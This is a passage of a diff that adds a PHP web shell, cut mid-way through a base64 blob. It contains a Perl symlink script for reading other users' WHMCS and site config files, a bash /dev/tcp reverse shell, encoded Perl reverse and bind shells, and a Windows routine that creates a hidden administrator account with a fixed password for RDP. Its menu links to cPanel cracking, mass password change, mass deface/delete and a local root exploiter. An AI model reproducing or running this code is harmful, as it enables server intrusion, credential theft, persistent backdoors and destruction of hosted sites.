D0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU1VQUE9SVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1N1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElORy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JpbGxpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQlVZL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTUFOQUdFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UU1VQUE9SVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudFN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NIRUNLT1VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jaGVja291dC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkdTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JBU0tFVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NFQ1VSRS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NBTEVTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zYWxlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTEwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1BVUkNIQVNFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wdXJjaGFzZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0FDQ09VTlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9BY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYWNjb3VudC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1VTRVIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Vc2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdXNlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVFMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50cy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkdTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL01ZL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9teS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS93aG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wYW5lbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1cHBvcnQvb3JkZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9DQopOw0KZm9yZWFjaCAoQGFycmF5KXsNCglteSAkY29uZmlnbnlhID0gJF8tPntjb25maWdkaXJ9Ow0KCW15ICR0eXBlY29uZmlnID0gJF8tPnt0eXBlfTsNCglzeW1saW5rKCIkY29uZmlnbnlhIiwiaWR4X3N5bS8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiKTsNCglta2RpciAiaWR4X3N5bS8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiOw0KCXN5bWxpbmsoIiRjb25maWdueWEiLCJpZHhfc3ltLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dC8weDE5OTkudHh0Iik7DQoJY29weSgiaWR4X3N5bS9uZW11LnR4dCIsImlkeF9zeW0vJHVzZXJueWEtJHR5cGVjb25maWcudHh0Ly5odGFjY2VzcyIpIDsNCgl9DQp9DQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50ICI8aGVhZD48dGl0bGU+QnlwYXNzIDQwNCBCeSAweDE5OTk8L3RpdGxlPjwvaGVhZD4iOw0KcHJpbnQgJzxtZXRhIGh0dHAtZXF1aXY9InJlZnJlc2giIGNvbnRlbnQ9IjU7IHVybD1pZHhfc3ltIi8+JzsNCnByaW50ICc8Ym9keT48Y2VudGVyPjxoMT4weDE5OTkgTmV2ZXIgRGllPC9oMT4nOw0KcHJpbnQgJzxhIGhyZWY9ImlkeF9zeW0iPktsaWsgRGlzaW5pPC9hPic7DQp1bmxpbmsoJDApOw==";
+			save("/tmp/symlink.pl", "w", base64_decode($sym['code']));
+			exe("perl /tmp/symlink.pl");
+			sleep(1);
+			@unlink("/tmp/symlink.pl");
+			@unlink("passwd.txt");
+			@unlink("idx_sym/pas.txt");
+			@unlink("idx_sym/nemu.txt");
+		}
+
+		print "<div style='background: #ffffff; width: 100%; height: 100%'>";
+		print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_sym/' frameborder='0' scrolling='yes'></iframe>";
+		print "</div>";
+	}
+	elseif($toolsname === "network") {
+		$args = explode(" ", $args);
+
+		if($args[0] === "bc") {
+			if(empty($args[1])) die(color(1, 1, "Set Your IP for BackConnect!"));
+			if(empty($args[2])) die(color(1, 1, "Set Your PORT for BackConnect!"));
+			if(empty($args[3])) die(color(1, 1, "Missing type of reverse shell: 'bash', 'perl'."));
+
+			if($args[3] === "bash") {
+				exe("/bin/bash -i >& /dev/tcp/".$args[1]."/".$args[2]." 0>&1");
+			}
+			elseif($args[3] === "perl") {
+				$bc['code'] = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
+				save("/tmp/bc.pl", "w", base64_decode($bc['code']));
+				$bc['exec'] = exe("perl /tmp/bc.pl ".$args[1]." ".$args[2]." 1>/dev/null 2>&1 &");
+				sleep(1);
+				print "<pre>".$bc['exec']."\n".exe("ps aux | grep bc.pl")."</pre>";
+				@unlink("/tmp/bc.pl");
+			}
+		}
+		elseif($args[0] === "bp") {
+			if(empty($args[1])) die(color(1, 1, "Set Your PORT for Bind Port!"));
+			if(empty($args[2])) die(color(1, 1, "Missing type of reverse shell: 'bash', 'perl'."));
+
+			if($args[2] === "perl") {
+				$bp['code'] = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
+				save("/tmp/bp.pl", "w", base64_decode($bp['code']));
+				$bp['exec'] = exe("perl /tmp/bp.pl ".$args[1]." 1>/dev/null 2>&1 &");
+				sleep(1);
+				print "<pre>".$bp['exec']."\n".exe("ps aux | grep bp.pl")."</pre>";
+				@unlink("/tmp/bp.pl");
+			}
+		}
+		else {
+			print color(1, 1, "Unknown '".$args[0]."'");
+		}
+	}
+	elseif($toolsname === "krdp") {
+		$args = explode(" ", $args);
+
+		if(OS() !== "Windows") die(color(1, 1, "Just For Windows Server"));
+		if(preg_match("/mabang/", exe("net user"))) die(color(1, 1, "[INFO] username 'mabang' already exists."));
+
+		$add_user   = exe("net user mabang mabang /add");
+    	$add_groups1 = exe("net localgroup Administrators mabang /add");
+    	$add_groups2 = exe("net localgroup Administrator mabang /add");
+    	$add_groups3 = exe("net localgroup Administrateur mabang /add");
+
+    	print "[ RDP ACCOUNT INFO ]<br>
+    	------------------------------<br>
+    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
+    	Username: ".color(1, 2, "mabang")."<br>
+    	Password: ".color(1, 2, "mabang")."<br>
+    	------------------------------<br><br>
+    	[ STATUS ]<br>
+    	------------------------------<br>
+    	";
+
+    	if($add_user) {
+    		print "[add user] -> ".color(1, 2, "SUCCESS")."<br>";
+    	} 
+    	else {
+    		print "[add user] -> ".color(1, 1, "FAILED")."<br>";
+    	}
+    	
+    	if($add_groups1) {
+        	print "[add localgroup Administrators] -> ".color(1, 2, "SUCCESS")."<br>";
+    	} 
+    	elseif($add_groups2) {
+            print "[add localgroup Administrator] -> ".color(1, 2, "SUCCESS")."<br>";
+    	} 
+    	elseif($add_groups3) { 
+            print "[add localgroup Administrateur] -> ".color(1, 2, "SUCCESS")."<br>";
+    	} 
+    	else {
+    		print "[add localgroup] -> ".color(1, 1, "FAILED")."<br>";
+    	}
+
+    	print "------------------------------<br>";
+	}
+}
+
+function files_and_folder() {
+	if(!is_dir(path())) die(color(1, 1, "Directory '".path()."' is not exists."));
+	if(!is_readable(path())) die(color(1, 1, "Directory '".path()."' not readable."));
+	print '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
+		   <tr>
+		   <th class="th_home"><center>Name</center></th>
+		   <th class="th_home"><center>Type</center></th>
+		   <th class="th_home"><center>Size</center></th>
+		   <th class="th_home"><center>Last Modified</center></th>
+		   <th class="th_home"><center>Owner/Group</center></th>
+		   <th class="th_home"><center>Permission</center></th>
+		   <th class="th_home"><center>Action</center></th>
+		   </tr>';
+
+	if(function_exists('opendir')) {
+		if($opendir = opendir(path())) {
+			while(($readdir = readdir($opendir)) !== false) {
+				$dir[] = $readdir;
+			}
+			closedir($opendir);
+		}
+		sort($dir);
+	} else {
+		$dir = scandir(path());
+	}
+
+	foreach($dir as $folder) {
+		$dirinfo['path'] = path().DIRECTORY_SEPARATOR.$folder;
+		if(!is_dir($dirinfo['path'])) continue;
+		$dirinfo['type']  = filetype($dirinfo['path']);
+		$dirinfo['time']  = date("F d Y g:i:s", filemtime($dirinfo['path']));
+		$dirinfo['size']  = "-";
+		$dirinfo['perms'] = writeable($dirinfo['path'], perms($dirinfo['path']));
+		$dirinfo['link']  = ($folder === ".." ? "<a href='?dir=".dirname(path())."'>$folder</a>" : ($folder === "." ?  "<a href='?dir=".path()."'>$folder</a>" : "<a href='?dir=".$dirinfo['path']."'>$folder</a>"));
+		$dirinfo['action']= ($folder === '.' || $folder === '..') ? "<a href='?act=newfile&dir=".path()."'>newfile</a> | <a href='?act=newfolder&dir=".path()."'>newfolder</a>" : "<a href='?act=rename_folder&dir=".$dirinfo['path']."'>rename</a> | <a href='?act=delete_folder&dir=".$dirinfo['path']."'>delete</a>";
+		if(function_exists('posix_getpwuid')) {
+			$dirinfo['owner'] = (object) @posix_getpwuid(fileowner($dirinfo['path']));
+			$dirinfo['owner'] = $dirinfo['owner']->name;
+		} else {
+			$dirinfo['owner'] = fileowner($dirinfo['path']);
+		}
+		if(function_exists('posix_getgrgid')) {
+			$dirinfo['group'] = (object) @posix_getgrgid(filegroup($dirinfo['path']));
+			$dirinfo['group'] = $dirinfo['group']->name;
+		} else {
+			$dirinfo['group'] = filegroup($dirinfo['path']);
+		}
+		print "<tr>";
+		print "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>".$dirinfo['link']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$dirinfo['type']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$dirinfo['size']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$dirinfo['time']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$dirinfo['owner'].DIRECTORY_SEPARATOR.$dirinfo['group']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$dirinfo['perms']."</td>";
+		print "<td class='td_home' style='padding-left: 15px;'>".$dirinfo['action']."</td>";
+		print "</tr>";
+	}
+	foreach($dir as $files) {
+		$fileinfo['path'] = path().DIRECTORY_SEPARATOR.$files;
+		if(!is_file($fileinfo['path'])) continue;
+		$fileinfo['type'] = filetype($fileinfo['path']);
+		$fileinfo['time'] = date("F d Y g:i:s", filemtime($fileinfo['path']));
+		$fileinfo['size'] = filesize($fileinfo['path'])/1024;
+		$fileinfo['size'] = round($fileinfo['size'],3);
+		$fileinfo['size'] = ($fileinfo['size'] > 1024) ? round($fileinfo['size']/1024,2). "MB" : $fileinfo['size']. "KB";
+		$fileinfo['perms']= writeable($fileinfo['path'], perms($fileinfo['path']));
+		if(function_exists('posix_getpwuid')) {
+			$fileinfo['owner'] =  (object) @posix_getpwuid(fileowner($fileinfo['path']));
+			$fileinfo['owner'] = $fileinfo['owner']->name;
+		} else {
+			$fileinfo['owner'] = fileowner($fileinfo['path']);
+		}
+		if(function_exists('posix_getgrgid')) {
+			$fileinfo['group'] = (object) @posix_getgrgid(filegroup($fileinfo['path']));
+			$fileinfo['group'] = $fileinfo['group']->name;
+		} else {
+			$fileinfo['group'] = filegroup($fileinfo['path']);
+		}
+		print "<tr>";
+		print "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=".path()."&file=".$fileinfo['path']."'>$files</a></td>";
+		print "<td class='td_home' style='text-align: center;'>".$fileinfo['type']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$fileinfo['size']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$fileinfo['time']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$fileinfo['owner'].DIRECTORY_SEPARATOR.$fileinfo['group']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$fileinfo['perms']."</td>";
+		print "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=".path()."&file=".$fileinfo['path']."'>edit</a> | <a href='?act=rename&dir=".path()."&file=".$fileinfo['path']."'>rename</a> | <a href='?act=delete&dir=".path()."&file=".$fileinfo['path']."'>delete</a> | <a href='?act=download&dir=".path()."&file=".$fileinfo['path']."'>download</a></td>";
+		print "</tr>";
+	}
+
+	print "</table>";
+	print "<br><center>Copyright &copy; ".date("Y")." - <a href='https://google.com/' target='_blank'>".color(1, 2, "Unknown45")."</a></center>";
+}
+
+
+function action() {
+	tools("upload");
+	tools("cmd");
+	print "<hr style='margin-top: 15px; margin-bottom: 10px;'>";
+	print "<center>";
+	print "<ul>";
+	print "<li>[ <a href='?'>Home Shell</a> ]</li>";
+	print "<li>[ <a href='?dir=".path()."&do=fakeroot'>Fake Root</a> ]</li>";
+	print "<li>[ <a href='?dir=".path()."&do=cpanel'>cPanel Crack</a> ]</li>";
+	print "<li>[ <a href='?dir=".path()."&do=mpc'>Mass Password Change</a> ]</li>";
+	print "<li>[ <a href='?dir=".path()."&do=mass'>Mass Deface/Delete</a> ]</li>";
+	print "<li>[ <a href='?dir=".path()."&do=lre'>Local Root Exploiter</a> ]</li>";
+	print "<li>[ <a href='?dir=".path()."&do=zoneh'>Zone-H</a> ]</li>";
+	print "</ul>";
+	print "</center>";
+	print "<hr style='margin-top: 15px; margin-bottom: 10px;'>";
+
+
+	if(isset($_GET['do'])) {
+		if($_GET['do'] === "cmd") {
+			if(isset($_POST['cmd'])) {
